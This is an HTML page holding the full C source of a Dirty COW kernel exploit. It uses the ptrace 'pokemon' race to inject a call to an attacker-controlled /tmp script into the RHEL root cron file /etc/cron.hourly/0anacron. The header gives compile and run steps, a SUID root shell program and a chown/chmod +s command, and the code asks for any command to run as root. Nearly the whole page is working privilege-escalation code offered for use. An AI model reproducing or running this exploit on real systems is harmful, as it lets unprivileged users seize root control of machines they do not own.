<!DOCTYPE html PUBLIC "-//W3C//DTD XHTML 1.0 Transitional//EN" "http://www.w3.org/TR/xhtml1/DTD/xhtml1-transitional.dtd">
<html xmlns="http://www.w3.org/1999/xhtml">
<head>
<meta http-equiv="Content-Type" content="text/html; charset=utf-8" />
<title>dirtycow pokemon exploit</title>
</head><body>/*<br/>
&nbsp;This exploit leverages the pokemon exploit of the dirtycow vulnerability<br/>
&nbsp;to write to the default 0anacron hourly crontab in RHEL. Any other script<br/>
&nbsp;in the cron.* directories can be substituted for the 0anacron script. This <br/>
&nbsp;option was chosen over the common /etc/passwd file because it's less intrusive.<br/>
&nbsp;The original /etc/cron.hourly/0anacron file is backed-up to /tmp/0anacron.bak,<br/>
&nbsp;at which point a comment line is overwritten with a call to a file in /tmp.<br/>
&nbsp;A path to a script in /tmp/ was chosen over a direct command due to size <br/>
&nbsp;limitiations in regard to the command and the comment being replaced in<br/>
&nbsp;the cron script. Comments were chosen because they provide the least <br/>
&nbsp;possibility for unintended consequences when overwriting cron tasks.<br/>
&nbsp;<br/>
&nbsp;Example of command to put in /tmp/* script:<br/>
&nbsp; &nbsp;chown root /home/&lt;user&gt;/shell;chmod +s /home/&lt;user&gt;/shell<br/>
&nbsp; &nbsp;<br/>
&nbsp;Example SUID binary - shell.c<br/>
&nbsp; &nbsp;#define _GNU_SOURCE<br/>
&nbsp; &nbsp;#include &lt;stdlib.h&gt;<br/>
&nbsp; &nbsp;#include &lt;unistd.h&gt;<br/>
&nbsp; &nbsp;void main(){<br/>
&nbsp; &nbsp; &nbsp; int euid = geteuid();<br/>
&nbsp; &nbsp; &nbsp; setresuid(euid,euid,euid);<br/>
&nbsp; &nbsp; &nbsp; execl("/bin/bash", "/bin/bash", &nbsp;NULL);<br/>
&nbsp; &nbsp;}<br/>
&nbsp;Original exploit (dirtycow's ptrace_pokedata "pokemon" method):<br/>
&nbsp; &nbsp;https://github.com/dirtycow/dirtycow.github.io/blob/master/pokemon.c<br/>
&nbsp;Compile with:<br/>
&nbsp; &nbsp;gcc -pthread cowcron.c -o cowcron<br/>
&nbsp;Then run the newly create binary by typing:<br/>
&nbsp; &nbsp;"./cowcron"<br/>
&nbsp;Be sure to restore "/etc/cron.hourly/0anacron" after running the exploit<br/>
&nbsp; &nbsp;mv /tmp/0anacron.bak /etc/cron.hourly/0anacron<br/>
&nbsp;<br/>
&nbsp;Exploit mashed-up by b0yd<br/>
&nbsp;https://www.securifera.com<br/>
*/<br/>
<br/>
#include &lt;fcntl.h&gt;<br/>
#include &lt;pthread.h&gt;<br/>
#include &lt;string.h&gt;<br/>
#include &lt;stdio.h&gt;<br/>
#include &lt;stdint.h&gt;<br/>
#include &lt;sys/mman.h&gt;<br/>
#include &lt;sys/types.h&gt;<br/>
#include &lt;sys/stat.h&gt;<br/>
#include &lt;sys/wait.h&gt;<br/>
#include &lt;sys/ptrace.h&gt;<br/>
#include &lt;stdlib.h&gt;<br/>
#include &lt;unistd.h&gt;<br/>
<br/>
const char *filename = "/etc/cron.hourly/0anacron";<br/>
const char *backup_filename = "/tmp/0anacron.bak";<br/>
const char *cmd_str = "/tmp/%c";<br/>
const char *copy_cmd = "cp /etc/cron.hourly/0anacron /tmp/0anacron.bak";<br/>
const char *end = ";#";<br/>
void cow( char *inj_cmd, unsigned start_offset );<br/>
<br/>
int f;<br/>
void *map;<br/>
char *inj_cmd;<br/>
pid_t pid;<br/>
pthread_t pth;<br/>
struct stat st;<br/>
<br/>
void *madviseThread(void *arg) {<br/>
&nbsp; &nbsp;int i, c = 0;<br/>
&nbsp; &nbsp;for(i = 0; i &lt; 200000000; i++) {<br/>
&nbsp; &nbsp; &nbsp; c += madvise(map, 100, MADV_DONTNEED);<br/>
&nbsp; &nbsp;}<br/>
&nbsp; &nbsp;//printf("[+] madvise %d\n\n", c);<br/>
}<br/>
<br/>
int copy_file(const char *from, const char *to) {<br/>
&nbsp; &nbsp;// check if target file already exists<br/>
&nbsp; &nbsp;if(access(to, F_OK) != -1) {<br/>
&nbsp; &nbsp; &nbsp; printf("[-] File %s already exists! Please delete it and run again\n",<br/>
&nbsp; &nbsp; &nbsp; to);<br/>
&nbsp; &nbsp; &nbsp; return -1;<br/>
&nbsp; &nbsp;}<br/>
<br/>
&nbsp; &nbsp;//Copy using system because I'm lazy and don't want to redo permissions.<br/>
&nbsp; &nbsp;system(copy_cmd);<br/>
<br/>
&nbsp; &nbsp;return 0;<br/>
}<br/>
<br/>
void create_tmp( char* passed_str ){<br/>
&nbsp; &nbsp;int fd;<br/>
&nbsp; &nbsp;unsigned int lw_char;<br/>
&nbsp; &nbsp;mode_t mode;<br/>
<br/>
&nbsp; &nbsp;//Get the necessary length<br/>
&nbsp; &nbsp;int req_len = strlen(cmd_str) + strlen(end);<br/>
&nbsp; &nbsp;inj_cmd = (char *)calloc(req_len, 1);<br/>
<br/>
&nbsp; &nbsp;/* initialize random seed: */<br/>
&nbsp; &nbsp;srand (time(NULL));<br/>
<br/>
&nbsp; &nbsp;while( 1 ){<br/>
&nbsp; &nbsp; &nbsp; //generate lowercase ascii char<br/>
&nbsp; &nbsp; &nbsp; lw_char = rand() % (122 - 97) + 97;<br/>
<br/>
&nbsp; &nbsp; &nbsp; sprintf(inj_cmd, cmd_str, lw_char);<br/>
&nbsp; &nbsp; &nbsp; if( access( inj_cmd, F_OK ) != -1 ) {<br/>
&nbsp; &nbsp; &nbsp; &nbsp; &nbsp;// file exists<br/>
&nbsp; &nbsp; &nbsp; &nbsp; &nbsp;continue;<br/>
&nbsp; &nbsp; &nbsp; } else {<br/>
&nbsp; &nbsp; &nbsp; &nbsp; &nbsp;// file doesn't exist<br/>
&nbsp; &nbsp; &nbsp; &nbsp; &nbsp;mode = S_IRWXU | S_IRWXG | S_IRWXO;<br/>
&nbsp; &nbsp; &nbsp; &nbsp; &nbsp;fd = creat(inj_cmd, mode);<br/>
&nbsp; &nbsp; &nbsp; &nbsp; &nbsp;write(fd, passed_str, strlen(passed_str));<br/>
&nbsp; &nbsp; &nbsp; &nbsp; &nbsp;close(fd);<br/>
&nbsp; &nbsp; &nbsp; &nbsp; &nbsp;printf("[+] Script file written at %s", inj_cmd);<br/>
&nbsp; &nbsp; &nbsp; &nbsp; &nbsp;puts("[+] Feel free to modify the script anytime before execution.\n");<br/>
&nbsp; &nbsp; &nbsp; &nbsp; &nbsp;break;<br/>
&nbsp; &nbsp; &nbsp; }&#09; &nbsp;<br/>
&nbsp; &nbsp;} &nbsp;<br/>
&nbsp; &nbsp;strcat(inj_cmd, end);<br/>
&nbsp; &nbsp;printf("[+] Inserting command: %s\n", inj_cmd);<br/>
}<br/>
<br/>
<br/>
void cow( char *inj_cmd, unsigned start_offset ){<br/>
&#09;<br/>
&nbsp; &nbsp;printf("[+] Writing \"%s\" at offset %d, Holdor...\n", inj_cmd, start_offset );<br/>
&nbsp; &nbsp;pid = fork();<br/>
&nbsp; &nbsp;if(pid) {<br/>
&nbsp; &nbsp; &nbsp; waitpid(pid, NULL, 0);<br/>
&nbsp; &nbsp; &nbsp; int u, i, o, c = 0;<br/>
&nbsp; &nbsp; &nbsp; int l=strlen(inj_cmd);<br/>
&nbsp; &nbsp; &nbsp; for(i = 0; i &lt; 10000/l; i++) {<br/>
&nbsp; &nbsp; &nbsp; &nbsp; &nbsp;for(o = 0; o &lt; l; o++) {<br/>
&nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; int offset = o + start_offset;<br/>
&nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; for(u = 0; u &lt; 10000; u++) {<br/>
&nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp;c += ptrace(PTRACE_POKETEXT, pid, map + offset, *((long*)(inj_cmd + o)));<br/>
&nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; }<br/>
&nbsp; &nbsp; &nbsp; &nbsp; &nbsp;}<br/>
&nbsp; &nbsp; &nbsp; }<br/>
&nbsp; &nbsp; &nbsp; //printf("[+] ptrace %d\n",c);<br/>
&nbsp; &nbsp;} else {<br/>
&nbsp; &nbsp; &nbsp; pthread_create(&amp;pth, NULL, madviseThread, NULL);<br/>
&nbsp; &nbsp; &nbsp; ptrace(PTRACE_TRACEME);<br/>
&nbsp; &nbsp; &nbsp; kill(getpid(), SIGSTOP);<br/>
&nbsp; &nbsp; &nbsp; pthread_join(pth,NULL);<br/>
&nbsp; &nbsp;}<br/>
<br/>
&nbsp; &nbsp;printf("[+] Done! Check %s to see if the new line was added.\n", filename);<br/>
&nbsp; &nbsp;printf("[*] Be sure to restore %s to %s\n", backup_filename, filename );<br/>
&nbsp;<br/>
}<br/>
<br/>
char *get_command(){<br/>
&#09;<br/>
&#09;char *line = NULL;<br/>
&nbsp; &nbsp; size_t len = 0;<br/>
&nbsp; &nbsp; ssize_t read;<br/>
&#09;<br/>
&#09;printf("Enter the command you want executed as root.\n");<br/>
&#09;printf("&gt; ");<br/>
&#09;<br/>
&#09;read = getline(&amp;line, &amp;len, stdin);<br/>
&#09;if( read == 1 ){<br/>
&nbsp; &nbsp; &nbsp; puts("[-] No command entered. Exiting");<br/>
&nbsp; &nbsp; &nbsp; exit(0);<br/>
&nbsp; &nbsp; }<br/>
&#09;<br/>
&#09;return line;<br/>
}<br/>
<br/>
int main(int argc, char *argv[]){<br/>
&nbsp; &nbsp;<br/>
&nbsp; &nbsp;// backup file<br/>
&nbsp; &nbsp;int ret = copy_file(filename, backup_filename);<br/>
&nbsp; &nbsp;if (ret != 0) {<br/>
&nbsp; &nbsp; &nbsp; exit(ret);<br/>
&nbsp; &nbsp;}<br/>
<br/>
&nbsp; &nbsp;char *cmd = get_command();<br/>
&nbsp; &nbsp;printf("[-] Command entered: %s\n", cmd);<br/>
<br/>
&nbsp; &nbsp;//Create the tmp file with executable permissions &nbsp; <br/>
&nbsp; &nbsp;create_tmp(cmd);<br/>
<br/>
&nbsp; &nbsp;f = open(filename, O_RDONLY);<br/>
&nbsp; &nbsp;fstat(f, &amp;st);<br/>
&nbsp; &nbsp;map = mmap(NULL, st.st_size + sizeof(long), PROT_READ, MAP_PRIVATE, f, 0);<br/>
&nbsp; &nbsp;//printf("[+] mmap: %lx\n",(unsigned long)map);&#09;&#09;<br/>
&nbsp; &nbsp;char *file_contents = (char *)calloc(st.st_size + sizeof(long) + 1, 1);<br/>
&nbsp; &nbsp;memcpy(file_contents, map, st.st_size);<br/>
<br/>
&nbsp; &nbsp;char *start = strstr(file_contents, "\n\n#");<br/>
&nbsp; &nbsp;//printf("Offset: %x\n", start);<br/>
&nbsp; &nbsp;if( start ){<br/>
&nbsp; &nbsp; &nbsp; start += 2;<br/>
&nbsp; &nbsp; &nbsp; //printf("Start: \n%s\n", start);<br/>
&nbsp; &nbsp; &nbsp; char *end = strstr(start, "\n");<br/>
&nbsp; &nbsp; &nbsp; //printf("Offset: %x\n", end);<br/>
&nbsp; &nbsp; &nbsp; if( end ){<br/>
&nbsp; &nbsp; &nbsp; &nbsp; &nbsp;char *comment = (char *)calloc(end - start + 1, 1);<br/>
&nbsp; &nbsp; &nbsp; &nbsp; &nbsp;memcpy(comment, start, end - start);<br/>
&nbsp; &nbsp; &nbsp; &nbsp; &nbsp;printf("[+] Found comment that can be replaced: \n\t%s\n", comment);<br/>
&nbsp; &nbsp; &nbsp; &nbsp; &nbsp;cow( inj_cmd, start - file_contents );<br/>
&nbsp; &nbsp; &nbsp; &nbsp; &nbsp;free(comment);&#09; &nbsp;<br/>
&nbsp; &nbsp; &nbsp; }<br/>
&nbsp; &nbsp;} else {<br/>
&nbsp; &nbsp; &nbsp; puts("[-] Unable to locate any comments in the file to replace.\n"); &nbsp;<br/>
&nbsp; &nbsp;}<br/>
<br/>
&nbsp; &nbsp;//Free resources<br/>
&nbsp; &nbsp;free(file_contents);<br/>
&nbsp; &nbsp;free(inj_cmd);<br/>
&nbsp; &nbsp;free(cmd);<br/>
&nbsp; &nbsp;close(f);<br/>
<br/>
&nbsp; &nbsp;return 0;<br/>
&nbsp; <br/>
} </body></html>